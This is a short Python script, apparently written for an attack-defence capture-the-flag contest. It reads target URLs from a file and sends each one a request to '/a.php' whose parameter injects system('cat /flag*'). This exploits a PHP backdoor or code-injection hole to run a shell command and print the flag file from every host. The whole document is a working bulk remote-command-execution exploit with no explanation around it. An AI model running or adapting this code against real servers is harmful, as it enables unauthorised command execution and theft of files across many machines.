import requests
def GetFlag(url):
	Target = url + Exploit
	report = requests.get(Target)
	return report.text
Exploit = "/a.php?adian=system('cat /flag*')"
f = open("Url.txt","r",encoding="utf-8")
while True:
        url = f.readline().strip('\n')
        if url == "":
        	break
        Flag = GetFlag(url)
        print("IP:%s\nFlag:%s\n==========================="%(url,Flag))
f.close()
print("All The Actions Done")
